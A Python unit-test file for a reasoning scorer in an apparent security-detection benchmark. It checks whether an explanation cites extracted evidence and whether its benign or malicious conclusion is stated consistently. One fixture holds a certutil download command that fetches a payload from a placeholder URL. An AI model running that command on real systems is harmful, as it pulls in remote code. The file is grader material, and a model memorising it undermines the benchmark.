"""Hardened reasoning heuristics (core/detection_scoring.score_reasoning):
- evidence-grounded credits short-form references (basename / username), not just
  the exact full claimed string;
- consistent is negation-aware so a benign explanation that says "no malicious
  activity" still reads as a benign conclusion."""
import unittest

from forcastl.core.detection_scoring import score_reasoning

FIELDS = ("event_ids", "processes", "accounts", "commands", "network", "registry")


def _p(explanation, **ev):
    return {"explanation": explanation,
            "evidence": {f: ev.get(f, []) for f in FIELDS}}


class TestEvidenceGroundedShortForms(unittest.TestCase):
    def test_basename_and_username_credited(self):
        # Model cites net.exe / helpdesk-svc; evidence holds the full path / domain\user.
        p = _p("The net.exe process was launched by helpdesk-svc during the audit.",
               processes=["C:\\Windows\\System32\\net.exe"],
               accounts=["OFFSEC\\helpdesk-svc"])
        self.assertIn("evidence-grounded", score_reasoning(p, {}, True)["details"])

    def test_command_exe_basename_credited(self):
        # The command's executable basename is matched even when evidence holds
        # the full path + arguments.
        p = _p("Saw certutil.exe downloading a payload, plus host fs01 in the logs.",
               commands=["C:\\Windows\\System32\\certutil.exe -urlcache -f http://x/y"],
               network=["fs01"])
        self.assertIn("evidence-grounded", score_reasoning(p, {}, True)["details"])

    def test_verbatim_still_works(self):
        p = _p("Observed 10.0.0.5 and the registry key HKLM\\Run being referenced here.",
               network=["10.0.0.5"], registry=["HKLM\\Run"])
        self.assertIn("evidence-grounded", score_reasoning(p, {}, True)["details"])

    def test_unrelated_explanation_not_grounded(self):
        # references nothing it extracted -> not grounded
        p = _p("Something happened on the system that may warrant a closer look later.",
               processes=["lsass.exe"], network=["10.0.0.5"])
        self.assertNotIn("evidence-grounded", score_reasoning(p, {}, True)["details"])


class TestConsistentNegationAware(unittest.TestCase):
    def test_benign_with_negated_malicious_is_consistent(self):
        p = _p("This is routine administrative activity with no malicious indicators present.")
        self.assertIn("consistent", score_reasoning(p, {}, False)["details"])

    def test_benign_not_an_attack_is_consistent(self):
        p = _p("Legitimate backup operation; this is not an attack and shows no signs of compromise.")
        self.assertIn("consistent", score_reasoning(p, {}, False)["details"])

    def test_malicious_conclusion_is_consistent(self):
        p = _p("This is malicious reconnaissance and a clear attack on domain admins.")
        self.assertIn("consistent", score_reasoning(p, {}, True)["details"])

    def test_benign_verdict_but_unnegated_attack_language_not_consistent(self):
        p = _p("This is a clear malicious attack and a compromise of the host system.")
        self.assertNotIn("consistent", score_reasoning(p, {}, False)["details"])


if __name__ == "__main__":
    unittest.main()
